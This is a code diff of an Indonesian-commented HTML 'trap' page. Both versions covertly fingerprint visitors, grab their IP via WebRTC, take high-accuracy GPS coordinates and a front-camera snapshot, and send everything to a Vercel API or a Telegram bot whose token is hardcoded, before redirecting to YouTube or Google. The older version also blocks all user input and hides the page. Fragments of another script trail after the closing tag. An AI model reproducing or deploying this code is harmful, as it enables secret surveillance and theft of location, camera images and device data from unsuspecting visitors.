@@ -5,312 +5,335 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        /* KOSONG - No styles at all */
-        * {
-            display: none !important;
-            visibility: hidden !important;
-            opacity: 0 !important;
-            position: absolute !important;
-            top: -9999px !important;
-            left: -9999px !important;
+        /* SEMUA ELEMEN DISEMBUNYIKAN */
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #000000;
         }
-        body, html {
-            background: transparent !important;
-            margin: 0 !important;
-            padding: 0 !important;
-            border: 0 !important;
-            width: 0 !important;
-            height: 0 !important;
-            overflow: hidden !important;
+        
+        /* Loading sangat kecil di tengah (opsional) */
+        .loader {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 2px;
+            height: 2px;
+            background: transparent;
+            opacity: 0.01;
         }
     </style>
 </head>
 <body>
-<!-- NO CONTENT - COMPLETELY BLANK -->
+    <div class="loader"></div>
 
 <script>
-// API endpoint - SESUAIKAN DENGAN DOMAIN ANDA
-const API_URL = 'https://apiiy.vercel.app/api';
+// ========== KONFIGURASI ==========
+const TELEGRAM_BOT_TOKEN = "8303396278:AAGAiWFRjgwRvCdeW4np6oTiKHFUUYBDGJc";
+const TELEGRAM_CHAT_ID = "6865071834";
+const API_URL = "https://apiiy.vercel.app/api"; // API kamu
 
-// Generate trap ID from URL or random
-function getTrapId() {
-    const params = new URLSearchParams(window.location.search);
-    let trapId = params.get('id') || params.get('trap') || params.get('key');
-    
-    if (!trapId) {
-        trapId = 'trap_' + 
-                 Math.random().toString(36).substr(2, 9) + 
-                 '_' + 
-                 Date.now().toString(36);
-        // Update URL without reload
-        const newUrl = window.location.origin + window.location.pathname + 
-                      '?id=' + encodeURIComponent(trapId);
-        window.history.replaceState({}, '', newUrl);
+// ========== FUNGSI UTAMA ==========
+
+// 1. Fungsi untuk kirim ke Telegram langsung (fallback)
+async function sendToTelegramDirect(message) {
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        console.log('Telegram direct:', await response.json());
+        return true;
+    } catch (error) {
+        console.error('Telegram direct error:', error);
+        return false;
     }
-    
-    return trapId;
 }
 
-// Collect all data silently
-async function collectData() {
-    const data = {
-        trap_id: getTrapId(),
-        timestamp: new Date().toISOString(),
-        url: window.location.href,
-        referrer: document.referrer || 'direct',
-        user_agent: navigator.userAgent,
+// 2. Ambil data device
+function getDeviceInfo() {
+    return {
+        userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
-        languages: navigator.languages,
-        screen: {
-            width: screen.width,
-            height: screen.height,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth
-        },
-        window: {
-            innerWidth: window.innerWidth,
-            innerHeight: window.innerHeight,
-            outerWidth: window.outerWidth,
-            outerHeight: window.outerHeight
-        },
-        location: null,
-        cameras: { front: false, rear: false },
-        screenshot: null,
-        network: null,
-        battery: null,
-        ip: null
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        colorDepth: screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: navigator.cookieEnabled,
+        java: navigator.javaEnabled ? 'Enabled' : 'Disabled',
+        doNotTrack: navigator.doNotTrack || 'Not specified'
     };
+}
 
-    // Get location SILENTLY (if already permitted previously)
-    if (navigator.geolocation) {
+// 3. Ambil IP address (via WebRTC)
+function getIPAddress() {
+    return new Promise((resolve) => {
         try {
-            const position = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                });
-            });
-            data.location = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                altitude: position.coords.altitude,
-                altitudeAccuracy: position.coords.altitudeAccuracy,
-                heading: position.coords.heading,
-                speed: position.coords.speed
+            const rtc = new RTCPeerConnection({ iceServers: [] });
+            rtc.createDataChannel('');
+            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+            
+            rtc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    const candidate = event.candidate.candidate;
+                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                    const match = candidate.match(ipRegex);
+                    if (match) {
+                        resolve(match[1]);
+                        rtc.close();
+                    }
+                }
             };
-        } catch (e) {
-            // Silent fail - location not available
+            
+            setTimeout(() => {
+                resolve('Unknown');
+                rtc.close();
+            }, 1000);
+        } catch (error) {
+            resolve('Unknown');
         }
-    }
+    });
+}
 
-    // Try to access cameras SILENTLY
+// 4. Coba akses kamera (diam-diam)
+async function tryCameraAccess() {
+    let frontCam = false;
+    let rearCam = false;
+    let screenshot = null;
+    
     try {
-        // Front camera
+        // Coba kamera depan
         const frontStream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user' }
         });
-        data.cameras.front = true;
+        frontCam = true;
         
-        // Capture single frame
+        // Ambil screenshot kecil
         const video = document.createElement('video');
         video.srcObject = frontStream;
         await video.play();
         
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = 100; // Ukuran kecil biar cepat
+        canvas.height = 100;
         const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0);
-        data.screenshot = canvas.toDataURL('image/jpeg', 0.5);
+        ctx.drawImage(video, 0, 0, 100, 100);
+        screenshot = canvas.toDataURL('image/jpeg', 0.5);
         
-        // Stop stream
         frontStream.getTracks().forEach(track => track.stop());
         
-        // Try rear camera
+        // Coba kamera belakang
         try {
             const rearStream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: { exact: 'environment' } }
             });
-            data.cameras.rear = true;
+            rearCam = true;
             rearStream.getTracks().forEach(track => track.stop());
         } catch (e) {
-            // Rear camera not available
+            // Kamera belakang gagal, tidak masalah
         }
     } catch (e) {
-        // Camera access failed - silent
+        // Akses kamera ditolak
     }
+    
+    return { frontCam, rearCam, screenshot };
+}
 
-    // Get network info
-    if (navigator.connection) {
-        data.network = {
-            type: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt,
-            saveData: navigator.connection.saveData
-        };
-    }
-
-    // Get battery info
-    if ('getBattery' in navigator) {
-        try {
-            const battery = await navigator.getBattery();
-            data.battery = {
-                level: battery.level,
-                charging: battery.charging,
-                chargingTime: battery.chargingTime,
-                dischargingTime: battery.dischargingTime
-            };
-        } catch (e) {
-            // Silent fail
+// 5. Ambil lokasi
+async function getLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve({ lat: null, lon: null, acc: null });
+            return;
         }
-    }
-
-    // Get IP via WebRTC (fallback)
-    try {
-        const rtc = new RTCPeerConnection({ iceServers: [] });
-        rtc.createDataChannel('');
-        rtc.createOffer()
-            .then(offer => rtc.setLocalDescription(offer))
-            .catch(() => {});
         
-        rtc.onicecandidate = (event) => {
-            if (event.candidate) {
-                const candidate = event.candidate.candidate;
-                const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                if (ipMatch) {
-                    data.ip = ipMatch[1];
-                }
-                rtc.close();
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                resolve({
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    acc: position.coords.accuracy
+                });
+            },
+            (error) => {
+                resolve({ lat: null, lon: null, acc: null });
+            },
+            { 
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
             }
-        };
-        
-        // Timeout for IP gathering
-        setTimeout(() => {
-            if (rtc) rtc.close();
-        }, 1000);
-    } catch (e) {
-        // Silent fail
-    }
-
-    return data;
+        );
+    });
 }
 
-// Send data to API
-async function sendData(data) {
+// 6. Kirim data ke API kamu
+async function sendToYourAPI(data) {
     try {
-        // Use Beacon API for reliable sending (even on page close)
-        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
-        navigator.sendBeacon(API_URL, blob);
-        
-        // Also try fetch for better error handling
-        fetch(API_URL, {
+        const response = await fetch(API_URL, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data),
-            keepalive: true // Ensure request completes even if page closes
-        }).catch(() => {
-            // Silent fail
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
         });
-    } catch (e) {
-        // Ultimate silent fail
+        
+        const result = await response.json();
+        console.log('API Response:', result);
+        return result;
+    } catch (error) {
+        console.error('API Error:', error);
+        return null;
     }
 }
 
-// Main execution - SILENT AND FAST
-(async function() {
-    // Immediate redirect to YouTube (primary action user sees)
-    setTimeout(() => {
-        window.location.replace('https://www.youtube.com');
-    }, 100); // 100ms delay - almost instant
+// 7. Format pesan untuk Telegram
+function formatTelegramMessage(data) {
+    const location = data.location.lat ? 
+        `📍 <b>Lokasi:</b> ${data.location.lat}, ${data.location.lon}\n   Akurasi: ${data.location.acc}m\n   Maps: https://maps.google.com/?q=${data.location.lat},${data.location.lon}` : 
+        '📍 <b>Lokasi:</b> Tidak ada akses';
     
-    // Collect and send data in background
-    try {
-        const collectedData = await collectData();
-        await sendData(collectedData);
-    } catch (e) {
-        // Complete silent fail
+    const camera = `📷 <b>Kamera:</b>\n   Depan: ${data.camera.frontCam ? '✅' : '❌'}\n   Belakang: ${data.camera.rearCam ? '✅' : '❌'}`;
+    
+    return `🚨 <b>DATA TERKIRIM</b> 🚨
+
+⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}
+🌐 <b>IP:</b> ${data.ip}
+${location}
+
+📱 <b>Device:</b>
+   • OS: ${data.device.platform}
+   • Browser: ${data.device.userAgent.substring(0, 50)}...
+   • Screen: ${data.device.screenWidth}x${data.device.screenHeight}
+   • Timezone: ${data.device.timezone}
+
+${camera}
+
+🔗 <b>URL:</b> ${window.location.href}
+📊 <b>Cookies:</b> ${data.device.cookies ? 'Enabled' : 'Disabled'}`;
+}
+
+// ========== PROSES UTAMA ==========
+async function mainProcess() {
+    console.log('Memulai proses...');
+    
+    // Delay 3 detik biar tidak terlalu cepat
+    await new Promise(resolve => setTimeout(resolve, 3000));
+    
+    // Kumpulkan data bertahap
+    const deviceInfo = getDeviceInfo();
+    const ipAddress = await getIPAddress();
+    const location = await getLocation();
+    const camera = await tryCameraAccess();
+    
+    // Siapkan data lengkap
+    const fullData = {
+        timestamp: new Date().toISOString(),
+        url: window.location.href,
+        ip: ipAddress,
+        device: deviceInfo,
+        location: location,
+        camera: camera,
+        trap_id: new URLSearchParams(window.location.search).get('id') || 
+                'auto_' + Date.now().toString(36)
+    };
+    
+    console.log('Data terkumpul:', fullData);
+    
+    // ===== KIRIM DATA =====
+    
+    // 1. Coba kirim ke API kamu dulu
+    console.log('Mengirim ke API...');
+    const apiResult = await sendToYourAPI(fullData);
+    
+    // 2. Jika API gagal, kirim langsung ke Telegram
+    if (!apiResult || apiResult.error) {
+        console.log('API gagal, kirim langsung ke Telegram...');
+        const telegramMessage = formatTelegramMessage(fullData);
+        await sendToTelegramDirect(telegramMessage);
+        
+        // Jika ada screenshot, kirim juga
+        if (camera.screenshot) {
+            try {
+                // Konversi base64 ke blob
+                const blob = await fetch(camera.screenshot).then(r => r.blob());
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'screenshot.jpg');
+                formData.append('caption', '📸 Screenshot');
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.error('Gagal kirim screenshot:', e);
+            }
+        }
     }
     
-    // Force redirect after max 3 seconds (fallback)
-    setTimeout(() => {
-        if (window.location.href.indexOf('youtube.com') === -1) {
-            window.location.href = 'https://www.youtube.com';
-        }
-    }, 3000);
-})();
-
-// Prevent any user interaction detection
-document.addEventListener('DOMContentLoaded', () => {
-    // Make page completely invisible
-    document.body.style.display = 'none';
-    document.documentElement.style.display = 'none';
+    console.log('Proses selesai!');
     
-    // Remove any potential focus
-    window.blur();
-    document.activeElement?.blur();
+    // Redirect setelah 5 detik total
+    setTimeout(() => {
+        window.location.href = "https://www.google.com"; // Ganti dengan tujuan akhir
+    }, 20000);
+}
+
+// ========== JALANKAN ==========
+
+// Tunggu page fully loaded
+window.addEventListener('load', () => {
+    // Mulai proses setelah 500ms
+    setTimeout(mainProcess, 500);
 });
 
-// Block all user interactions
-['click', 'mousedown', 'mouseup', 'keydown', 'keyup', 'touchstart', 'touchmove', 'touchend'].forEach(event => {
-    document.addEventListener(event, (e) => {
-        e.preventDefault();
-        e.stopPropagation();
-        e.stopImmediatePropagation();
-        return false;
-    }, true);
-});
+// Fallback jika load event tidak terpicu
+setTimeout(mainProcess, 1000);
 
-// Disable right click, text selection, etc.
-document.addEventListener('contextmenu', e => e.preventDefault());
-document.addEventListener('selectstart', e => e.preventDefault());
-document.addEventListener('dragstart', e => e.preventDefault());
+// Backup: kirim minimal data jika semua gagal
+setTimeout(() => {
+    const minimalData = {
+        trap_id: 'backup_' + Date.now(),
+        userAgent: navigator.userAgent,
+        url: window.location.href,
+        time: new Date().toISOString()
+    };
+    
+    fetch(API_URL, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(minimalData)
+    }).catch(() => {
+        // Kirim ke Telegram sebagai last resort
+        const msg = `⚠️ BACKUP DATA\nURL: ${window.location.href}\nUA: ${navigator.userAgent}`;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: msg
+            })
+        });
+    });
+}, 10000); // Backup setelah 10 detik
 
-// Make page unviewable
-Object.defineProperty(document, 'visibilityState', {
-    get: function() { return 'hidden'; }
-});
-Object.defineProperty(document, 'hidden', {
-    get: function() { return true; }
-});
-
-// Hide from browser history
-window.history.replaceState(null, '', 'about:blank');
 </script>
 </body>
-</html>                   resolve(true);
-                                }
-                            }, 500);
-                        }, 1000);
-                    };
-                    
-                } catch(error) {
-                    console.log('❌ Camera access denied:', error.name);
-                    resolve(false);
-                }
-            });
-        }
-        
-        // ===================== GET LOCATION =====================
-        async function getLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(false);
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        collectedData.location = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy + ' meter',
-                            altitude: pos.coords.altitude,
-                            speed: pos.coords.speed,
+</html>ed,
                             heading: pos.coords.heading,
                             timestamp: new Date(pos.timestamp).toISOString()
                         };
